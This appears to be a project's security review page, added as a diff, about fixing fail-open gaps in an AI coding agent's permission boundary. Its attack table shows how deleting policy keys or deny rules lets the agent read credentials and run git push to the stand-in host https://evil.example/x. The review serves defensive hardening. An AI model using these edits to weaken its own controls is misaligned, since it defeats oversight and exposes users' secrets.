@@ -1,0 +1,157 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Review 0080: Make the agent permission boundary fail closed</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500&family=Space+Grotesk:wght@500;700&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --ink:#16161A; --mute:#6E6E76; --rule:#C9CCC4; --paper:#F4F2EC; --panel:#FBFAF6;
+      --lime:#B6E300; --lime-ink:#46590a;
+      --display:"Space Grotesk", system-ui, sans-serif;
+      --body:"Inter", system-ui, sans-serif;
+    }
+    *{box-sizing:border-box;}
+    body{margin:0; background:var(--paper); color:var(--ink); font-family:var(--body); line-height:1.7; font-feature-settings:"tnum" 1; -webkit-font-smoothing:antialiased;}
+    main{max-width:780px; margin:0 auto; padding:72px 28px 96px;}
+
+    .topmeta{font-family:var(--display); font-weight:500; font-size:.74rem; letter-spacing:.12em; text-transform:uppercase; color:var(--mute); display:flex; flex-wrap:wrap; gap:8px 16px; align-items:center; margin:0 0 26px; padding-bottom:14px; border-bottom:1px solid var(--rule);}
+    .topmeta .num, .topmeta b{color:var(--ink); font-weight:500;}
+    .topmeta .dot{width:6px; height:6px; background:var(--lime); border-radius:50%;}
+
+    h1{font-family:var(--display); font-weight:700; font-size:2.9rem; line-height:1.05; letter-spacing:-.01em; margin:0 0 18px;}
+    .lead{font-size:1.12rem; max-width:60ch; margin:0 0 22px;}
+    .lead b{font-weight:500; box-shadow:inset 0 -.5em 0 rgba(182,227,0,.45);}
+
+    section{margin:54px 0 0;}
+    .kicker{font-family:var(--display); font-weight:500; font-size:.72rem; letter-spacing:.2em; text-transform:uppercase; color:var(--mute); margin:0 0 16px; display:flex; align-items:center; gap:10px;}
+    .kicker::before{content:""; width:18px; height:1px; background:var(--rule);}
+    .sub{color:var(--mute); margin:-6px 0 16px;}
+
+    .approval{border-top:2px solid var(--ink); padding-top:18px;}
+    .approval .kicker{color:var(--lime-ink);}
+    .approval .kicker::before{background:var(--lime); width:26px; height:2px;}
+    ol.asks{list-style:none; counter-reset:a; margin:0; padding:0;}
+    ol.asks li{counter-increment:a; position:relative; padding:16px 0 16px 46px; border-bottom:1px solid var(--rule);}
+    ol.asks li:last-child{border-bottom:0;}
+    ol.asks li::before{content:counter(a,decimal-leading-zero); position:absolute; left:0; top:16px; font-family:var(--display); font-weight:700; font-size:1.5rem; color:var(--lime-ink); line-height:1.15;}
+
+    table{width:100%; border-collapse:collapse; margin:0;}
+    th,td{text-align:left; vertical-align:top; padding:12px 16px 12px 0; border-bottom:1px solid var(--rule);}
+    thead th{font-family:var(--display); font-weight:500; font-size:.72rem; letter-spacing:.13em; text-transform:uppercase; color:var(--mute);}
+    tbody td:first-child{font-weight:500;}
+    tbody tr:last-child td{border-bottom:0;}
+    code{font-family:ui-monospace, SFMono-Regular, Consolas, monospace; font-size:.86em; background:rgba(0,0,0,.05); padding:2px 6px; border-radius:4px; overflow-wrap:anywhere;}
+
+    .risk{background:var(--panel); border:1px solid var(--rule); border-left:3px solid var(--ink); padding:18px 22px;}
+    .risk p{margin:0;}
+
+    ul.scope{list-style:none; margin:0; padding:0;}
+    ul.scope li{position:relative; padding:11px 0 11px 22px; border-bottom:1px solid var(--rule); color:var(--mute);}
+    ul.scope li:last-child{border-bottom:0;}
+    ul.scope li::before{content:"—"; position:absolute; left:0; color:var(--rule);}
+
+    h3{font-family:var(--display); font-weight:500; font-size:1rem; margin:0 0 6px;}
+    .checklist{border-top:1px solid var(--rule); padding-top:8px;}
+    .check{padding:18px 0; border-bottom:1px solid var(--rule);}
+    .check:last-child{border-bottom:0;}
+    .check > p{color:var(--mute); margin:0 0 12px;}
+    .check table{margin-top:6px;}
+
+    p{margin:0 0 12px;} p:last-child{margin-bottom:0;}
+    a{color:var(--lime-ink); text-underline-offset:3px;}
+    .foot{margin-top:68px; border-top:1px solid var(--rule); padding-top:16px; font-size:.8rem; color:var(--mute);}
+  </style>
+</head>
+<body>
+  <main>
+    <header>
+      <p class="topmeta"><span>Owner review</span><span class="dot"></span><span class="num">0080</span><span><b>Draft</b></span><span><b>2026-07-10</b></span></p>
+      <h1>Make the agent permission boundary fail closed</h1>
+      <p class="lead">Deleting two keys from <code>agent-policy/policy.json</code> erased the credential-read boundary and the push allowlist. <b>The gate stayed green, the generated config protected nothing, and the PreToolUse hook allowed a push to any remote.</b> Reproduced end to end, then fixed at all three layers.</p>
+    </header>
+
+    <section class="approval">
+      <p class="kicker">Requested Approval</p>
+      <ol class="asks">
+        <li><b>Fail closed on a missing key.</b> <code>@($policy.key).Count -eq 0</code> never fires on a <i>deleted</i> key: PowerShell's <code>@($null).Count</code> is <b>1</b>. The gate now rejects an absent key, a null, an empty list, and a blank entry (an empty-string prefix matches every remote; a whitespace one matches none — both are meaningless). Applied to <code>credentialDenyRead</code>, <code>pushRemoteAllowedPrefixes</code>, <code>allowBaseline</code>; the structural keys <code>deny</code> / <code>protectedPaths</code> / <code>hooks</code> must exist so no check passes vacuously.</li>
+        <li><b>Pin every deny rule the rules name.</b> <code>$requiredDeny</code> held four ids while SEC-01 names curl <i>and wget</i> uploads and GOV-03 names the destructive git commands. It now names all ten. Deleting <code>wget-upload</code> or <code>hard-reset</code> previously passed green.</li>
+        <li><b>Check the compiled output, not only the source's self-consistency.</b> The <code>-Verify</code> sync check regenerates the config from the same weakened policy, so it is always "in sync". A new check reads the generated <code>.claude/settings.json</code> and asserts a <code>Read(&lt;path&gt;)</code> deny rule exists for each declared credential path. (This pins that the declared paths reach the config; it does not yet pin that the declared paths <i>are</i> the real credential roots — see Risk.)</li>
+        <li><b>Fail closed at runtime and at generation.</b> The PreToolUse hook denies a push to an explicit remote URL when the allowlist is missing/empty/blank; the generator throws instead of compiling the meaningless rules <code>Read()</code> and <code>Read(/**)</code>.</li>
+        <li><b>Force review on the boundary.</b> <code>agent-policy/</code> and <code>scripts/hooks/</code> join the high-risk paths that require a linked review artifact.</li>
+      </ol>
+    </section>
+
+    <section>
+      <p class="kicker">Reproduced, Before and After</p>
+      <p class="sub">Each attack was run against an isolated copy of the repository. "Before" is the state on <code>main</code> today.</p>
+      <table>
+        <thead><tr><th>Attack (one edit to a tracked file)</th><th>Before</th><th>After</th></tr></thead>
+        <tbody>
+          <tr><td>Delete <code>credentialDenyRead</code> + <code>pushRemoteAllowedPrefixes</code>, regenerate config</td><td><b>Gate exit 0</b> — "required deny rules set, harness config in sync"; only <code>Read()</code> and <code>Read(/**)</code> remain</td><td>exit 1, both keys named</td></tr>
+          <tr><td><code>git push https://evil.example/x</code> with the allowlist deleted</td><td><b>Hook allows it</b> (no decision emitted)</td><td>Hook denies</td></tr>
+          <tr><td>Remove the <code>wget-upload</code> deny rule</td><td>Gate exit 0 — the wget exfiltration channel reopens</td><td>exit 1</td></tr>
+          <tr><td>Remove <code>hard-reset</code> / <code>clean-force</code> / <code>branch-force-delete</code> / <code>rm-rf-home</code></td><td>Gate exit 0</td><td>exit 1</td></tr>
+          <tr><td>Hand-strip the <code>Read(...)</code> rules from <code>.claude/settings.json</code></td><td>Caught only by the sync check</td><td>Caught explicitly, per credential path</td></tr>
+          <tr><td>Empty-string entry <code>""</code> in <code>pushRemoteAllowedPrefixes</code></td><td>Gate exit 0; the hook allows every remote (<code>StartsWith("")</code> is true)</td><td>exit 1</td></tr>
+        </tbody>
+      </table>
+    </section>
+
+    <section>
+      <p class="kicker">Risk</p>
+      <div class="risk">
+        <p>Low to make; the change only adds refusals. It cannot weaken any boundary, and a legitimate policy passes unchanged (verified). What it costs: retiring a deny rule now requires editing the gate — deliberate, matching how <code>scope</code> and <code>guidance</code> values are pinned. What it does not fix: value substitution. A non-blank but overbroad push prefix (<code>["https://"]</code>) passes the gate and the hook then allows every https remote; junk credential paths (<code>["x"]</code>) pass while dropping the real <code>~/.aws</code> / <code>~/.ssh</code> / <code>~/.netrc</code>. Both are now surfaced by the review-artifact gate rather than pinned. <code>$requiredDeny</code> likewise remains hand-maintained, so a new exfiltration channel added to the policy without adding its id here is not pinned. And this repairs one control surface only — the same audit confirmed 26 further fail-opens across the suite, including a secret scanner that misses UTF-16 files.</p>
+      </div>
+    </section>
+
+    <section>
+      <p class="kicker">Not Decided Here</p>
+      <ul class="scope">
+        <li>The other 26 confirmed audit findings (secret scanner encoding coverage, spec-gate substance check, sandbox credential-mount denylist, and more) — each needs its own change.</li>
+        <li>Wiring <code>scripts/tests/</code> into a run lane so these fixes are guarded against regression. Currently nothing runs it.</li>
+        <li>Deriving <code>$requiredDeny</code> from the policy's own categories instead of a hand-maintained list.</li>
+      </ul>
+    </section>
+
+    <section class="checklist">
+      <p class="kicker">Author Checks</p>
+
+      <div class="check" data-guardrail="standard-terminology">
+        <h3>Terminology Check</h3>
+        <p>Does this artifact use industry-standard terms, mapping any project-specific wording to standard vocabulary?</p>
+        <table>
+          <thead><tr><th>Term in this artifact</th><th>Standard term / meaning</th></tr></thead>
+          <tbody>
+            <tr><td>Fail closed / fail open</td><td>On a fault or missing input, a fail-closed control denies; a fail-open control permits. The deleted key made three layers fail open at once.</td></tr>
+            <tr><td>Vacuous pass</td><td>A check that succeeds because its subject is empty — the logical sense of "vacuously true". Absent keys made several checks vacuous.</td></tr>
+            <tr><td>Self-consistency vs. property verification</td><td>Regenerating an artifact from its source and comparing proves only that the transform is deterministic, not that the source encodes the required property. The new <code>Read(&lt;path&gt;)</code> assertion checks the property.</td></tr>
+            <tr><td>Exfiltration channel</td><td>A path by which data leaves the trust boundary — here request-body uploads (curl/wget), gist sharing, and pushing to an unknown git remote.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="check" data-guardrail="primary-references">
+        <h3>References / Primary Sources</h3>
+        <p>Were the primary sources behind this decision consulted directly?</p>
+        <table>
+          <thead><tr><th>Source consulted</th><th>What it supports</th></tr></thead>
+          <tbody>
+            <tr><td><a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_arrays">PowerShell about_Arrays</a> / measured directly</td><td><code>@($null).Count</code> is 1 while <code>@(@()).Count</code> is 0 — the mechanism that made the emptiness guard unreachable. Measured on pwsh 7.2.24.</td></tr>
+            <tr><td><a href="https://learn.microsoft.com/en-us/dotnet/api/system.string.startswith">String.StartsWith</a> / measured directly</td><td><code>"https://evil.example/x".StartsWith([string]$null)</code> is <code>$true</code> — why the hook allowed every remote once the allowlist was deleted.</td></tr>
+            <tr><td><code>monitor/registry.json</code> rule texts for SEC-01 and GOV-03</td><td>The rules promise curl <i>and wget</i> uploads and the destructive git commands; the gate pinned only four ids.</td></tr>
+            <tr><td>Adversarial fail-open audit of the guardrail suite (2026-07-10)</td><td>Where the finding came from; each candidate was verified by three independent skeptics before being reported.</td></tr>
+            <tr><td>Local verification log (isolated repository copies)</td><td>Six attacks passing before the fix and failing after; the hook driven directly with a crafted PreToolUse payload.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+    </section>
+
+    <p class="foot">Project Shelf · Owner review artifact</p>
+  </main>
+</body>
+</html>
